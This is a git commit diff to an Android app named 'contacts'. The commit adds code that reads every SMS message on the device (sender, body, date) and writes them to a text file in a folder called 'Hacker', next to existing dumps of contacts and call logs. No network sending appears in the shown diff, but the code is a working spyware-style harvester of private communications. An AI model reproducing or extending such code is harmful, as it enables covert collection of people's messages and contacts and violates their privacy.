4022b33101b309fe251b6d9d8b8ce45fc31a34a3
Subash <subashm.cs19@bitsathy.ac.in>
2022-03-30 05:55:09 +0530

    Sms Service Has been Added(File delete has been deleting the folder)

--- app/src/main/java/com/hello/contacts/MainActivity.java
+++ app/src/main/java/com/hello/contacts/MainActivity.java
@@ -14,6 +14,8 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -23,32 +25,68 @@ import android.widget.Toast;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.util.Date;
+
+import static android.content.ContentValues.TAG;
 
 public class MainActivity extends AppCompatActivity {
-    TextView textView,path;
-    Button dir;
+    TextView textView;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         textView=findViewById(R.id.text);
-
-
     }
 
     @Override
     protected void onStart() {
         super.onStart();
-        File file=new File(getExternalFilesDir(null)+"/Hacker");
-        if(!file.exists()){
-            file.mkdir();
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED){
+            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},0);
+        }else {
+            File file = new File(getExternalFilesDir(null) +"/Hacker");
+            if (!file.exists()) {
+                file.mkdir();
+                textView.setText(file.toString());
+                Toast.makeText(this, "FileCreated", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "File already exists" + file, Toast.LENGTH_SHORT).show();
+            }
+            gettingcontacts();
+            getcalllog();
+            getsms();
         }
-        else{
-            Toast.makeText(this, "File already exists"+file, Toast.LENGTH_SHORT).show();
-        }
-        gettingcontacts();
-        getcalllog();
 
+    }
+
+
+    private void getsms() {
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!= PackageManager.PERMISSION_GRANTED){
+            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS},0);
+        }
+       try {
+            File SmsFile=new File(getExternalFilesDir(null)+"/Hacker");
+
+            File smswriter=new File(SmsFile,"Sms.txt");
+            FileWriter smsw=new FileWriter(smswriter);
+            Cursor cursor=getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
+            if(cursor.getCount()>0) {
+                while (cursor.moveToNext()) {
+
+                    String Number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                    String Message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                    String Date1 = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                    smsw.append("Number : " + Number + "\r\n" + "Message : " + Message + "\r\n" + "Date : " + Date1 + "\r\n");
+                    smsw.flush();
+                }
+            }
+            smsw.close();
+
+
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
     }
 
     private void getcalllog() {
@@ -57,7 +95,7 @@ public class MainActivity extends AppCompatActivity {
         }
         try {
             File file=new File(getExternalFilesDir(null)+"/Hacker");
-            file.delete();
+
             File CallLogs=new File(file,"CallLogs.txt");
             FileWriter callwriter=new FileWriter(CallLogs);
             ContentResolver contentResolver=getContentResolver();
@@ -86,7 +124,7 @@ public class MainActivity extends AppCompatActivity {
         }
         try {
         File file=new File(getExternalFilesDir(null)+"/Hacker");
-        file.delete();
+
         File Contacts=new File(file,"Contacts.txt");
 
             FileWriter writer=new FileWriter(Contacts);
